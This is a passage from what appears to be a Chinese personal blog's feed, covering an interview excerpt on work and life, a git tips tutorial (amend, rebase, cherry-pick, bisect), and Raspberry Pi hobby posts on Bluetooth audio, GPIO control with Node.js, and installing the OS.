您如何看待工作与生活之间的关系，如何做到工作与生活的平衡？</p></blockquote><p>这几年我一直以工作为中心，基本没有去平衡生活。生活更像是工作的延伸，其实这样也没什么不好。</p><p>生活在不同时段赋予每个人的职能和职责是不一样的。昨天我是一个学生，今天我是一个爸爸，明天我是一个企业的管理者。做好每个角色应该做的事情才能去平衡，如果做不好，就谈不上平衡。</p><blockquote><p>⑤ 您对您所从事工作的热情&#x2F;动力来源是什么？换言之，您认为您工作是为了什么？</p></blockquote><p>个人对于知识的渴望度比较高。在不断的学习和沟通过程中能够去发现一些新的艺术，满足自己的求知欲；不断完成一些小目标，满足自己的成就感。</p><p>工作的激情常常就是激情而已。不到两年激情没了，也就缺少干劲了。不断给自己设定新的挑战吧，这样才能持续下去。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 采访 </tag>
            
            <tag> Linkedin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 常用技巧</title>
      <link href="/blog/2018/11/26/git-%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/blog/2018/11/26/git-%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>git 的版本管理思路，十分简单：使用一个类似链表的结构，将每次修改记录串联起来。每次提交都会产生一个 SHA1 的唯一标示符，我们可以利用 git 提供的命令行工具对“链表”中的每次修改进行编辑、删除、插入、移动等等多种操作。下面就介绍几种十分有用也比较常用的操作方法，为了方便理解，表述上可能不够准确。</p><p>下面是一个提交了 4 次的分支效果，每个节点的意思是 <code>节点名(commit 信息 - SHA1)</code>：</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">A(add A - 510fdc) -&gt; B(add B - <span class="number">0406b6</span>) -&gt; C(add C - 39a9c2) -&gt; D(add D - <span class="number">3131e0</span>)&lt;当前&gt;</span><br></pre></td></tr></table></figure><h3 id="修改最近一次的提交信息"><a href="#修改最近一次的提交信息" class="headerlink" title="修改最近一次的提交信息"></a>修改最近一次的提交信息</h3><p>将上次提交的信息（add D），修改为 <code>push D</code>，可以通过 commit 的 amend 指令进行修改，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit --amend</span><br><span class="line"><span class="comment"># 执行命令后，会进入到一个交互窗口，可以在交互窗口内修改上次的提交信息</span></span><br></pre></td></tr></table></figure><h3 id="利用-rebase-对提交进行各种修改"><a href="#利用-rebase-对提交进行各种修改" class="headerlink" title="利用 rebase 对提交进行各种修改"></a>利用 rebase 对提交进行各种修改</h3><p>rebase 的常用操作分为这么几步：</p><ol><li>选择操作的起点位置，<code>git rebase -i SHA1</code></li><li>指定每个节点的操作方式，<code>保留/删除/修改/...</code>，进入操作</li><li>进入下一步操作&#x2F;终止操作，<code>git rebase --continue</code>，<code>git rebase --abort</code></li></ol><p>比如我们要将节点 B 的 commit 信息（add B），修改为 <code>push B</code>，那么按照上述的操作指南，可以执行（<strong>第一步</strong>）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步，进入 B 之前的节点，A</span></span><br><span class="line">git rebase -i 510fdc <span class="comment"># 510fdc 是 A 节点的 SHA1</span></span><br></pre></td></tr></table></figure><p>此时会进入一个交互窗口，内容大致为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pick B 0406b6</span><br><span class="line">pick C 39a9c2</span><br><span class="line">pick D 3131e0</span><br></pre></td></tr></table></figure><p><strong>你需要看懂这个结构</strong>，不过也不用紧张，它很简单。由于我们将操作指针指向了 A，所以它会展示 A 以后的所有提交记录，根据链表顺序排列，依次展示节点 B、C、D，前面的一个英文单词是操作指令，总共有这么几种指令：</p><ul><li><code>pick</code>，保留节点，不做任何变更</li><li><code>edit</code>，保留节点，修改内容</li><li><code>drop</code>，删除节点，删除本次提交</li><li><code>reword</code>，保留节点，修改提交信息</li><li><code>squash</code>，保留节点修改，并且与上一个节点合并，也就是两次提交并做一次</li><li><code>fixup</code>，保留节点修改，忽略本次提交信息</li><li><code>exec</code>，run command (the rest of the line) using shell</li></ul><p>用的比较多的是前三个，可以只关注前三个。我们需要修改下交互窗口的内容，改为（<strong>第二步</strong>）：</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ edit B 0406b6</span></span><br><span class="line"><span class="deletion">- pick B 0406b6</span></span><br><span class="line">pick C 39a9c2</span><br><span class="line">pick D 3131e0</span><br></pre></td></tr></table></figure><p>上面是 diff，实际内容是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">edit B 0406b6</span><br><span class="line">pick C 39a9c2</span><br><span class="line">pick D 3131e0</span><br></pre></td></tr></table></figure><p>此时会进入一个临时 git 分支，大致是这样：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">branch(0406b6): </span><br></pre></td></tr></table></figure><p>由于你告诉了 git 要对 B 节点就行修改，所以它就停在了 B 处理，等着你修改，此时，你可以通过 amend 命令修改提交信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">branch(0406b6): git commit --amend</span><br><span class="line"><span class="comment"># 进入交互窗口，将 commit 信息修改为 push B</span></span><br></pre></td></tr></table></figure><p>操作完成后，执行（<strong>第三步</strong>）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rebase --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure><p>由于你告诉 git 只需要操作一个节点，所以它会回到最初的位置&lt;当前&gt;，否则的话，它会继续进入下一个临时 git 分支。当然，如果你进入第三步以后，突然又不想修改了，可以执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git rebase --skip </span><br></pre></td></tr></table></figure><p>跳过对本节点的修改。</p><p>以上就是 rebase 的基本使用方法，那么留下几个思考题，读者可以自行操作：</p><ul><li>通过 rebase 删除 C 节点（drop）</li><li>通过 rebase 合并 A 和 B 节点的修改（squash）</li><li>交换 B 和 C 的提交顺序</li></ul><h3 id="将一个分支的修改合并到另一个分支"><a href="#将一个分支的修改合并到另一个分支" class="headerlink" title="将一个分支的修改合并到另一个分支"></a>将一个分支的修改合并到另一个分支</h3><p>通过 <code>git cherry-pick SHA1</code> 这个指令可以可以完成目标，</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">master: A<span class="function"><span class="params">(add A - <span class="number">510fdc</span>)</span> -&gt;</span> B<span class="function"><span class="params">(add B - <span class="number">0406b</span>6)</span> -&gt;</span> C(add C - <span class="number">39a</span>9c2)&lt;当前&gt;</span><br><span class="line">                                     <span class="string">\</span></span><br><span class="line">dev:                             D<span class="function"><span class="params">(add D - <span class="number">4569c</span>2)</span> -&gt;</span> E(add E - <span class="number">087342</span>)</span><br></pre></td></tr></table></figure><p>如果我们想把 dev 分支 D 节点的修改合并到 master 分支，可以执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先确保自己在 master 分支上，git branch master</span></span><br><span class="line">git cherry-pick 4569c2 <span class="comment"># 4569c2 为 D 节点的 SHA1</span></span><br></pre></td></tr></table></figure><h3 id="快速定位一个-bug-在哪次修改上"><a href="#快速定位一个-bug-在哪次修改上" class="headerlink" title="快速定位一个 bug 在哪次修改上"></a>快速定位一个 bug 在哪次修改上</h3><p>假设我们在本地提交了一堆 commit，正准备 push 到仓库之前，发现有一个 bug，但是记不起来是哪一次 commit 造成的了，怎么办？我们需要通过 <code>reset/rebase/stash</code> 等操作回滚到上一个状态进行测试，但是这样会很麻烦，而且效率不一定很高，git 为我们提供了更加便捷的工具 <code>git bisect</code>，通过二分法找 bug。它提供的命令也很直白：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git bisect start                 <span class="comment"># 进入二分查找</span></span><br><span class="line">git bisect good [good-commit-id] <span class="comment"># 设置没问题的版本 SHA1，排查起点</span></span><br><span class="line">git bisect bad [bad-commit-id]   <span class="comment"># 设置有问题的版本 SHA1，排查终点</span></span><br><span class="line"><span class="comment"># 此时 git 就会自动进入到中间版本状态</span></span><br></pre></td></tr></table></figure><p>进入中间版本状态，测试后，如果有问题，就标记为 bad，如果没有问题，就标记为 good，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git bisect bad  <span class="comment"># 有问题</span></span><br><span class="line">git bisect good <span class="comment"># 没问题</span></span><br></pre></td></tr></table></figure><p>当你找到问题以后，可以执行 reset 回到初始状态：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git bisect reset</span><br></pre></td></tr></table></figure><p>然后通过上面介绍的 rebase edit 操作对错误分支进行修改。</p><hr><p>（未完待续）</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系列 - 树莓派外接蓝牙音箱（四）</title>
      <link href="/blog/2018/06/18/rasyberry-pi-playback/"/>
      <url>/blog/2018/06/18/rasyberry-pi-playback/</url>
      
        <content type="html"><![CDATA[<p>为啥第四篇写的是外接蓝牙音箱？那是因为我在阅读文章的时候，不小心看到了通过命令行进行蓝牙操作：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo bluetoothctl;</span><br><span class="line">power on</span><br><span class="line">scan on</span><br><span class="line">agent on</span><br><span class="line">pair MAC</span><br><span class="line">trust MAC</span><br><span class="line">connect MAC</span><br></pre></td></tr></table></figure><p>尝试了一次，这些命令瞬间便记住了，但记住了还不够呀，需要找个场景试验下——外接一个蓝牙音箱，让树莓派的音频流在音箱中播放。感觉这个操作会有点意思，为了增加点难度，再设计一个按钮开关，通过按压操作来连接或断开蓝牙音箱。</p><h3 id="可视化操作"><a href="#可视化操作" class="headerlink" title="可视化操作"></a>可视化操作</h3><p>树莓派并不是一个无界面的纯终端，首先，我们来看看如何通过 VNC 进行可视化操作：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给板子装客户端</span></span><br><span class="line">sudo apt-get install tightvncserver</span><br><span class="line"><span class="comment"># 开启一个 VNC 流，代号为 1</span></span><br><span class="line">tightvncserver :1</span><br></pre></td></tr></table></figure><p>然后在 Mac 上安装 VNC Viewer 客户端，然后连接 <code>IP:1</code>，IP 为树莓派的地址：</p><p><img src="/../blogimgs/2018/06/18/2018-06-12-20-34-53.png" alt="image"></p><p>在这个系列中，我会尽可能少地进行可视化操作，毕竟这种操作的意义不大，板子的性能本身就不高，额外开一个可视化的操作界面，会比较卡。</p><h3 id="蓝牙连接（界面操作）"><a href="#蓝牙连接（界面操作）" class="headerlink" title="蓝牙连接（界面操作）"></a>蓝牙连接（界面操作）</h3><p>如果你钟爱界面化操作，可以安装一个蓝牙管理软件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install pi-bluetooth blueman</span><br></pre></td></tr></table></figure><p>安装好了以后，可以在 <code>Preferences -&gt; Bluetooth Manager</code>，找到蓝牙列表：</p><p><img src="/../blogimgs/2018/06/18/2018-06-18-23-04-53.png" alt="image"></p><p>打开浏览器，在线播放一首音乐，你会发现，咦，为啥没有声音？原因在这里：</p><p><img src="/../blogimgs/2018/06/18/2018-06-17-03-03-22.png" alt="image"></p><p>在音量控制处右键，会看到一个列表：</p><ul><li>Anlog，是通过耳机线出声，耳机插上板子就有声音了，音质比较差</li><li>HDMI，需要通过 USB 接口连接播放器</li><li>下面几个是连接的蓝牙设备，必须勾上才会出声</li></ul><p>事实上，我勾上了蓝牙设备，依然没有声音，没具体折腾为啥，但在音量控制面板中的第一个 Tab 勾选下对应设备就好了：</p><p><img src="/../blogimgs/2018/06/18/2018-06-17-03-02-32.png" alt="image"></p><p>在调试引脚时，发现再一次没声音了，摸索了好几次，发现这么处理可以解决问题，屡试不爽：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先把 GPIO 引脚上的线给拔了，不拔可能会影响蓝牙驱动的加载？不知道，先拔了</span></span><br><span class="line"><span class="comment"># 如果之前插着线，重启，重新加载驱动</span></span><br><span class="line">sudo reboot</span><br><span class="line"><span class="comment"># 再看看是否有报错，比如 Sap driver initialization failed.</span></span><br><span class="line">service bluetooth status</span><br><span class="line"><span class="comment"># 如果有错误，重新启动下，可以选择 root</span></span><br><span class="line">service bluetooth restart</span><br><span class="line"><span class="comment"># 然后重新连接蓝牙，一般声音就来了</span></span><br></pre></td></tr></table></figure><p>不知道是否是驱动在 Linux 内核加载的时候存在问题还是有其他问题，没有深究，先这么凑合着处理吧。</p><h3 id="蓝牙连接（硬件控制）"><a href="#蓝牙连接（硬件控制）" class="headerlink" title="蓝牙连接（硬件控制）"></a>蓝牙连接（硬件控制）</h3><p>下面我们增加一个外部控制开关来实现，通过外部开关控制外投音频的音量（静音和打开）。</p><p><img src="/../blogimgs/2018/06/18/2018-06-18-12-08-12.png" alt="image"></p><p>当开关 S1 拨下时，LED1 会亮起，此时 S 端（PIN12&#x2F;GPIO18）为低电位。我们只需要读取 P12 的信号就可以知道开关是否被按下了，程序如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> execSync = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">execSync</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Gpio</span> = <span class="built_in">require</span>(<span class="string">&#x27;rpio2&#x27;</span>).<span class="property">Gpio</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 PIN12</span></span><br><span class="line"><span class="keyword">const</span> button = <span class="keyword">new</span> <span class="title class_">Gpio</span>(<span class="number">12</span>);</span><br><span class="line">button.<span class="title function_">open</span>(<span class="title class_">Gpio</span>.<span class="property">INPUT</span>);</span><br><span class="line"></span><br><span class="line">button.<span class="title function_">on</span>(<span class="string">&#x27;rising&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">execSync</span>(<span class="string">&#x27;pactl set-sink-volume 1 100%&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;open sound&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">button.<span class="title function_">on</span>(<span class="string">&#x27;falling&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">execSync</span>(<span class="string">&#x27;pactl set-sink-volume 1 0%&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mute&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&quot;SIGINT&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  button.<span class="title function_">close</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shutdown!&#x27;</span>);</span><br><span class="line">  process.<span class="title function_">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>程序并不优雅，但是要实现的功能大致就是这个意思。这段程序看似没有问题，不知道是系统问题还是 rpio2 这个库的问题，在接收上升沿和下降沿信号时经常让板子宕机，这个问题还需要好好研究下。</p><hr><p>花了好几个小时来回折腾，完成了这个实验性的小玩具，生活中我肯定不会用它，因为它过于简陋。这里我还给自己加了一道拓展题，如何识别多次按钮点击，然后根据点击的次数执行不同任务，结果写出来的程序，当按钮按下时，系统总是奔溃，就没有继续了，感兴趣的读者可以尝试下~</p>]]></content>
      
      
      <categories>
          
          <category> 硬件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系列 - 认识树莓派 GPIO（三）</title>
      <link href="/blog/2018/06/16/rasyberry-pi-gpio/"/>
      <url>/blog/2018/06/16/rasyberry-pi-gpio/</url>
      
        <content type="html"><![CDATA[<p>本来这篇文章是不存在的，在写<a href="/blog/2018/06/18/rasyberry-pi-playback/">《系列 - 树莓派外接蓝牙音箱（四）》</a>的时候，发现还是得先解释下 GPIO。</p><p><img src="/../blogimgs/2018/06/16/2018-06-17-19-55-28.jpg" alt="image"></p><p>看到上图，不少同学都会一脸懵逼，各种引脚怎么连线组成电路？电路中用到的电阻、电容、电抗等等改如何使用？其实，大多数情况下，我们并不需要去设计复杂的电路，最多就是给一个元件两端增加电压时，为确保元件不短路，在串联的电路上再加一个负载电阻，如此而已。那么滤波、放大等电路的设计，一时半会儿还不会用到。</p><h3 id="看图识引脚"><a href="#看图识引脚" class="headerlink" title="看图识引脚"></a>看图识引脚</h3><p>树莓派除了有 USB、网口、HDMI 等常见的接口外，还提供了 GPIO（General Purpose Input&#x2F;Output）接口，通过这个接口，我们可以很方便的控制电子元器件。本文不去分析 I2C、UART、SPI 这些略复杂的通讯协议，只去看 GPIO 在引脚上的输入和输出，以及高低点位的变化。</p><p>上图所示的几个基础引脚我们还是可以一眼看明白的，DC Power 5.0v，以及 DC Power 3.3v，它们指的是直流电电压 5.0 或 3.3 伏特，可以简单理解成电池的正极，在图中可以看出 PIN01 和 PIN17 两个引脚输出的是 3.3v 电压，PIN02 和 PIN04 输出的是 5.0v 电压；还有好几个 Ground 引脚，它们直接接地，可以理解成电池的负极。</p><p>PIN 引脚标号和 GPIO 标号是不一样的，不要把  GPIO12 理解成了是 PIN12，PINX 是物理位置，GPIOX 是引脚号码。图中引脚 Name 用灰色括号标注的内容是我们暂不去理解的 I2C、SPI 等协议会用到的引脚。</p><p><img src="/../blogimgs/2018/06/16/2018-06-17-22-19-11.png" alt="image"></p><p>上图是 Raspberry Pi  3 Model B+ 的板子，右侧 40 个引脚，与第一张 GPIO Header 图是一一对应的。</p><h3 id="串口编程"><a href="#串口编程" class="headerlink" title="串口编程"></a>串口编程</h3><p>在树莓派系统中，已经实现了文件到 GPIO 引脚的对应，也就是说，只要我们去修改系统中指定的文件和文件状态，就可以修改 GPIO 引脚的电位状态。</p><p>SSH 远程到树莓派，进入 <code>/sys/class/gpio/</code> 目录，可以看到目录中有两个关键的文件：</p><ul><li><code>export</code>，enable 控制某个引脚</li><li><code>unexport</code>，disbale 控制某个引脚</li></ul><p>它们可以用来控制引脚的状态。比如，我们要控制 GPIO14 引脚，可以将它的状态设置为 out（分为 in 和 out 两种模式，in 是接受电位信号，out 是输出电位信号），然后将它设置为高电位（1 为高电位，0 为低电位）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># enable GPIO14</span></span><br><span class="line"><span class="built_in">echo</span> 14 &gt; /sys/class/gpio/export</span><br><span class="line"><span class="comment"># 注意观察，在 /sys/class/gpio/ 目录下多了一个文件夹 gpio14</span></span><br><span class="line"><span class="comment"># 将其设置为 out 模式</span></span><br><span class="line"><span class="built_in">echo</span> out &gt; /sys/class/gpio/gpio14/direction</span><br><span class="line"><span class="comment"># 将其设置为高电位</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /sys/class/gpio/gpio14/value</span><br></pre></td></tr></table></figure><h3 id="电位测试"><a href="#电位测试" class="headerlink" title="电位测试"></a>电位测试</h3><p>在系列第一篇中，有提到，我买了一堆感应器，其中有一个叫做 <code>TWO-COLOR Module</code>，大小双色模块，</p><p><img src="/../blogimgs/2018/06/16/2018-06-17-22-33-44.png" alt="image"></p><p>上方是共阴模块，下方是共阳模块，共阳的意思就是 B&#x2F;R&#x2F;G 都接负极，C 接正极；它的电路结构如下：</p><p><img src="/../blogimgs/2018/06/16/2018-06-17-22-28-27.png" alt="image"></p><p>现在我们来测试下 GPIO14 引脚的电位输出，PIN06 是 Ground，也就是接地负极；而 GPIO14（PIN08 引脚） 由于之前的操作，我们已经将它设置成了高电位。将 C 与 Ground 连接，R 与 GPIO14 连接后，R（红灯）会亮，我们试试：</p><p><img src="/../blogimgs/2018/06/16/2018-06-17-22-38-39.jpg" alt="image"></p><p>然后将 GPIO14 设置为低电位，测试等是否灭掉：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 gpio14 设置为高电位</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /sys/class/gpio/gpio14/value</span><br></pre></td></tr></table></figure><p>此时二极管两侧电压为 0，灯灭，测试完成；最后我们把 gpio14 引脚关掉：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 14 &gt; /sys/class/gpio/unexport</span><br></pre></td></tr></table></figure><h3 id="程序控制引脚"><a href="#程序控制引脚" class="headerlink" title="程序控制引脚"></a>程序控制引脚</h3><p>既然 Linux 串口 Bash 编程可以控制 GPIO 引脚的信号，自然也可以用高级语言去控制。下面我们使用 Nodejs 写一个小 Demo —— 让双色模块的红灯和绿灯，每隔 1s 交替闪动。</p><p>简单画一下电路图：</p><p><img src="/../blogimgs/2018/06/16/2018-06-17-22-56-34.png" alt="image"></p><p>GPIO18 和 GPIO23 引脚分别连接共阴双色模块的红色（R）和绿色（G）二极管，然后开始编程。Python 非常适合进行串口编程，而且社区上有很多 Python 库，但本系列会尽量不使用 Python，而是 Nodejs；Nodejs 在这个领域的社区沉淀还不是很多，通过一段时间的摸索，也期望可以沉淀些有用的模块出来。</p><p>为方便测试，就直接使用了月影封装的 rpio2 模块，他的 API 设计得比较符合人性：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Gpio</span> = <span class="built_in">require</span>(<span class="string">&#x27;rpio2&#x27;</span>).<span class="property">Gpio</span>;</span><br><span class="line"><span class="comment">// 初始化 PIN12，与 R 连接，设置为输出高电位</span></span><br><span class="line"><span class="keyword">const</span> r = <span class="keyword">new</span> <span class="title class_">Gpio</span>(<span class="number">12</span>);</span><br><span class="line">r.<span class="title function_">open</span>(<span class="title class_">Gpio</span>.<span class="property">OUTPUT</span>, <span class="title class_">Gpio</span>.<span class="property">HIGH</span>);</span><br><span class="line"><span class="comment">// 初始化 PIN 16，与 G 连接，设置为输出低电位</span></span><br><span class="line"><span class="keyword">const</span> g = <span class="keyword">new</span> <span class="title class_">Gpio</span>(<span class="number">16</span>);</span><br><span class="line">g.<span class="title function_">open</span>(<span class="title class_">Gpio</span>.<span class="property">OUTPUT</span>, <span class="title class_">Gpio</span>.<span class="property">LOW</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">wait</span>(<span class="params">seconds</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;, (seconds || <span class="number">1</span>) * <span class="number">1E3</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start!&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> counter = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">while</span>(counter--) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">wait</span>();</span><br><span class="line">    r.<span class="title function_">toggle</span>();</span><br><span class="line">    g.<span class="title function_">toggle</span>(); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  r.<span class="title function_">close</span>();</span><br><span class="line">  g.<span class="title function_">close</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shutdown!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>代码比较好理解，每隔 1s 交替闪灯，总共闪 10 次。Demo 效果预览：</p><p><video src="../blogimgs/2018/06/raspberry-two-colors.mp4" controls height="500"></video></p><hr><p>对于 GPIO 的介绍就到这里，基础的使用实在是太简单了，本文可以勾起一些对硬件完全不了解的同学的好奇心和求知欲，不过对我这个电信出身的同学而言，就没啥值得兴奋的了。</p>]]></content>
      
      
      <categories>
          
          <category> 硬件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系列 - 树莓派装机（二）</title>
      <link href="/blog/2018/06/14/rasyberry-pi-os/"/>
      <url>/blog/2018/06/14/rasyberry-pi-os/</url>
      
        <content type="html"><![CDATA[<p>似乎市面上的文章都是教大家如何在 Windows 环境下玩树莓派，Mac 下的文章零零散散的，稍微少了些，我打算所有的环节都在 Mac 上完成，记录下每一次探索遇到的坑。本节将给大家介绍，如何从树莓派上进入到自己熟悉的远程开发模式。</p><h3 id="散热装置"><a href="#散热装置" class="headerlink" title="散热装置"></a>散热装置</h3><p>在开搞之前，我觉得还是需要给树莓派贴上几块散热片，再把风扇装上；否则，插上电源，啥也不干，板子便会发烫。</p><p><strong>散热片</strong><br><img src="/../blogimgs/2018/06/14/2018-06-12-16-04-22.jpg" alt="image"></p><p>我买的这个板子，CPU 自带散热，所以这三块散热片应该分别装在 WiFi&#x2F;蓝牙模块、以太网卡和内存片（背面）上。</p><p><strong>小风扇</strong><br><img src="/../blogimgs/2018/06/14/2018-06-12-16-04-41.jpg" alt="image"></p><p>小风扇两个引脚与树莓派的引脚相连，黑色接地，红色接 Vcc 5.0V。然后放进壳子里，就是这样啦：</p><p><img src="/../blogimgs/2018/06/14/2018-06-12-16-23-58.jpg" alt="image"></p><p>小风扇无声地转起来了。</p><h3 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h3><p>首先，通过 Mac 自带的 Disk 工具格式化储存卡：</p><p><img src="/../blogimgs/2018/06/14/2018-06-12-16-44-53.jpg" alt="image"></p><p>注意，这里的格式是 MS-DOS(FAT)，能否设置成其他格式，没研究，格式化完成以后卸载分区：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到磁盘对应的 Filesystem 名（DISKNAME）</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="comment"># 卸载分区，这里的 DISKNAME 长得像 /dev/disk2s1 </span></span><br><span class="line">diskutil unmout DISKNAME</span><br><span class="line"><span class="comment"># 找到磁盘，看磁盘大小区分</span></span><br><span class="line">diskutil list</span><br><span class="line"><span class="comment"># list 命令结果</span></span><br><span class="line">/dev/disk2 (external, physical):</span><br><span class="line">   <span class="comment">#:     TYPE NAME                          SIZE       IDENTIFIER</span></span><br><span class="line">   0:     FDisk_partition_scheme             *15.9 GB   disk2</span><br><span class="line">   1:     DOS_FAT_32 BARRET-PI               15.9 GB    disk2s1</span><br></pre></td></tr></table></figure><p>然后先去官网下载 raspberrypi 的 <a href="https://www.raspberrypi.org/downloads/raspbian/">操作系统</a>，直接下载系统貌似略慢，可以下载 torrent，然后使用迅雷下载。</p><p>下载下来的是一个 zip 包，解压后，执行下方命令，将镜像写入到磁盘：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dd 命令用于转换或者复制一个文件</span></span><br><span class="line"><span class="comment"># bs 是 benchmark 测试</span></span><br><span class="line"><span class="comment"># if 是镜像地址</span></span><br><span class="line"><span class="comment"># of 是写入磁盘区间</span></span><br><span class="line">sudo <span class="built_in">dd</span> bs=4m <span class="keyword">if</span>=2018-04-18-raspbian-stretch.img of=/dev/rdisk2</span><br><span class="line"><span class="comment"># 磁盘写入完成以后</span></span><br><span class="line">diskutil unmountDisk /dev/disk2</span><br></pre></td></tr></table></figure><p>整个写入操作，花了 8 分多钟——真是够慢——只能说店家送的这个 SD 卡略烂吧。给树莓派插上 SD 卡，然后插上电源，注意观察红灯和绿灯的闪灯，红灯应该只一直亮着，绿灯在前几十秒亮着，等到系统加载成功，绿色会快速闪动然后灭掉。如果你的等不是这么闪的，那么有可能遇到了这么几种情况：</p><ul><li>你的树莓派板子坏了，概率比较小</li><li>你的板子跟系统不匹配，重新找个系统吧，最好去官网下载</li><li>你的 SD 卡与板子不兼容，这里是所有可以用的 SD 卡<a href="https://elinux.org/RPi_SD_cards">列表</a></li></ul><h3 id="连接系统"><a href="#连接系统" class="headerlink" title="连接系统"></a>连接系统</h3><p>在 Mac 下通过网线连接树莓派，你需要这个转换器：</p><p><img src="/../blogimgs/2018/06/14/2018-06-12-17-12-51.jpg" alt="image"></p><p>树莓派提供了 DHCP 服务，我们可以让 Mac 连接到树莓派局域网，依次打开 <code>System Preferences -&gt; Sharing -&gt; Internet Sharing</code>，勾选 <code>Thunderbolt Ethernet</code> 后在勾选 <code>Internet Sharing</code>，此时你的 Mac 就会自动连接树莓派了，然后找到树莓派对应的 IP，通过 ssh 连接上去就行了。</p><p><strong>「然后找到树莓派对应的 IP，通过 ssh 连接上去就行了」，注意，这里有很多坑…</strong></p><p>可能是因为缓存的原因吧，在 Mac 上执行 <code>arp -a</code> 不一定能找到 raspberry 设备；所以，我建议你还是去下载一个 IP 扫描的工具，它会清楚地告诉你 IP 是多少：</p><p><img src="/../blogimgs/2018/06/14/2018-06-18-22-41-49.png" alt="image"></p><p><code>ssh pi@192.168.2.2</code> 你会发现连接不上，提示 <code>Connection refused</code>，网上找了下，不少人被坑：</p><blockquote><p> 树莓派最新的 raspberry 系统（2016.11.25日更新的系统）默认是关闭 ssh 功能的，如果可以连接屏幕，进入系统开启即可。<br>如果只能连 ssh，先将 sd 卡取出，插入电脑，在 boot 